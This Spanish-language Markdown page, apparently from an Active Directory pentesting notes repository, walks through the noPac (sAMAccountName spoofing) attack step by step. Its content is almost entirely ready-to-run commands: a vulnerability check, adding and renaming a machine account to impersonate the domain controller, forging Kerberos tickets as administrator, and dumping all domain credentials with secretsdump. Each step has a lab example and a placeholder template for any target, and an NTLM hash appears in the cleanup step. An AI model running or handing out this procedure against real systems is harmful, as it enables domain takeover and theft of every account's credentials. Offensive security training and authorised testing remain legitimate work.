# SamAccountName (nopac)

Para este ataque se va a añadir un ordenador, borrar el SPN de ese ordenador, renombrar el ordenador con el mismo nombre que el DC, obtener un TGT para ese ordenador, restablecer el nombre del ordenador a su nombre original, obtener un ticket de servicio con el TGT que obtuvimos anteriormente y finalmente dcsync :)


```Bash
# Comprobamos que el equipo es vulnerable a nopac
poetry run crackmapexec smb <ip del DC> -u <user> -p <pass> -M nopac
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/vid.gif?raw=true "Check NoPac")

```Bash
# Necesitamos una versión específica de impacket para los scripts renameMachine.py y getST.py
git clone https://github.com/SecureAuthCorp/impacket myimpacket
cd myimpacket
git fetch origin pull/1224/head:1224
git fetch origin pull/1202/head:1202
git merge 1202
git merge 1224
cd ..
git clone https://github.com/dirkjanm/krbrelayx
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/vid2.gif?raw=true "Descargando herramientas necesarias")

```Bash
# Añadimos un nuevo equipo
#~ python addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH 'north.sevenkingdoms.local/arya.stark:Needle'
python addcomputer.py -computer-name 'samaccountname$' -computer-pass 'ComputerPassword' -dc-host <nombre completo del DC en el dominio> -domain-netbios <dominio> '<dominio>/<user>:<pass>'
# Borramos el SPN del equipo con el script que debemos sacar del repositorio: https://github.com/dirkjanm/krbrelayx
#~ python addspn.py --clear -t 'samaccountname$' -u 'north.sevenkingdoms.local\arya.stark' -p 'Needle' 'winterfell.north.sevenkingdoms.local'
python addspn.py --clear -t 'samaccountname$' -u '<dominio>/<user>' -p 'pass' '<nombre completo del DC en el dominio>'
# Renombrar el nuevo equipo con el nombre del DC
#~ python renameMachine.py -current-name 'samaccountname$' -new-name 'winterfell' -dc-ip 'winterfell.north.sevenkingdoms.local' north.sevenkingdoms.local/arya.stark:Needle
python renameMachine.py -current-name 'samaccountname$' -new-name '<nombre DC>' -dc-ip '<nombre completo del DC en el dominio>' <dominio>/<user>:<pass>
# Obtenemos el TGT
#~ python getTGT.py -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell':'ComputerPassword'
python getTGT.py -dc-ip '<nombre completo del DC en el dominio>' '<dominio>'/'<nombre DC (nuevo equipo)>':'<pass equipo>'
# Devolvemos el nuevo equipo al nombre oriaginal
#~ python renameMachine.py -current-name 'winterfell' -new-name 'samaccountname$' north.sevenkingdoms.local/arya.stark:Needle
python renameMachine.py -current-name '<nombre DC (nuevo equipo)>' -new-name 'samaccountname$' <dominio>/<user>:<pass>
# Obtenemos el ST (service ticket) con S4U2self usando el TGT previo
#~ export KRB5CCNAME=winterfell.ccache
#~ python getST.py -self -impersonate 'administrator' -altservice 'CIFS/winterfell.north.sevenkingdoms.local' -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' 'north.sevenkingdoms.local'/'winterfell' -debug
export KRB5CCNAME=<nombre DC (nuevo equipo)>.ccache
python getST.py -self -impersonate 'administrator' -altservice 'CIFS/<nombre completo del DC en el dominio>' -k -no-pass -dc-ip '<nombre completo del DC en el dominio>' '>dominio>'/'<nombre DC (nuevo equipo)>' -debug
# DCSync presentando el ST
#~ export KRB5CCNAME=administrator@CIFS_winterfell.north.sevenkingdoms.local@NORTH.SEVENKINGDOMS.LOCAL.ccache
#~ python secretsdump.py -k -no-pass -dc-ip 'winterfell.north.sevenkingdoms.local' @'winterfell.north.sevenkingdoms.local'
export KRB5CCNAME=administrator@CIFS_<nombre completo del DC en el dominio>@<dominio completo>.ccache
python secretsdump.py -k -no-pass -dc-ip '<nombre completo del DC en el dominio>' @'<nombre completo del DC en el dominio>'
# Eliminamos el equipo creado
#~ python addcomputer.py -computer-name 'samaccountname$' -delete -dc-host winterfell.north.sevenkingdoms.local -domain-netbios NORTH -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' 'north.sevenkingdoms.local/Administrator'
python addcomputer.py -computer-name 'samaccountname$' -delete -dc-host <nombre completo del DC en el dominio> -domain-netbios <dominio> -hashes 'aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4' '<dominio>/Administrator'
```

![Alt text](https://github.com/jor6PS/ad-from-0-to-Hero/blob/master/valid_credentials/nopac/vid3.gif?raw=true "NoPac manual")
